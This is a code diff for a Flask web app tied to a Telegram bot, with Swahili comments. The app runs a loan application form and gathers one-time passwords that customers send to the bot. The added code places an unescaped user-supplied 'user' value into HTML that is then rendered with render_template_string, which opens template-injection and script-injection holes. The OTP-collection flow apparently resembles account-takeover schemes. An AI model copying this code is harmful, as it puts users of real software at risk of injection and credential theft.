@@ -55,22 +55,28 @@ def send_telegram(chat_id, text, keyboard=None):
 
 @app.route('/')
 def home():
-    return render_template_string(STEP1_HTML)
+    user_id = request.args.get('user')
+    html = STEP1_HTML.replace('</form>', f'<input type="hidden" name="user" value="{user_id}"></form>')
+    return render_template_string(html)
 
 @app.route('/step2', methods=['POST'])
 def step2():
     session['amount'] = request.form['amount']
     session['months'] = request.form['months']
-    return render_template_string(STEP2_HTML)
+    session['user'] = request.form['user']
+    html = STEP2_HTML.replace('</form>', f'<input type="hidden" name="user" value="{request.form["user"]}"></form>')
+    return render_template_string(html)
 
 @app.route('/step3', methods=['POST'])
 def step3():
     session['purpose'] = request.form['purpose']
-    return render_template_string(STEP3_HTML)
+    session['user'] = request.form['user']
+    html = STEP3_HTML.replace('</form>', f'<input type="hidden" name="user" value="{request.form["user"]}"></form>')
+    return render_template_string(html)
 
 @app.route('/submit', methods=['POST'])
 def submit():
-    user_id = request.args.get('user')
+    user_id = request.form.get('user') # SASA TUNACHUKUA KUTOKA FORM
     if not user_id:
         return "<h3 style='text-align:center; color:red;margin-top:50px;'>Error: Fungua link kutoka kwa bot ya Telegram</h3>"
 
@@ -95,7 +101,6 @@ def submit():
 @app.route(f"/{TOKEN}", methods=['POST'])
 def telegram_webhook():
     update = request.get_json()
-    print("Received:", update)
 
     if 'message' in update:
         chat_id = update['message']['chat']['id']
@@ -105,7 +110,6 @@ def telegram_webhook():
             msg = f"Habari! Anza maombi hapa:\n{request.url_root}?user={chat_id}"
             send_telegram(chat_id, msg)
 
-        # ANGALIA KAMA MTEJA ANAJIBU OTP
         for app_id, otp_data in list(CURRENT_OTP.items()):
             if str(otp_data.get('user_chat_id')) == str(chat_id) and otp_data.get('waiting') == True:
                 user_otp = text
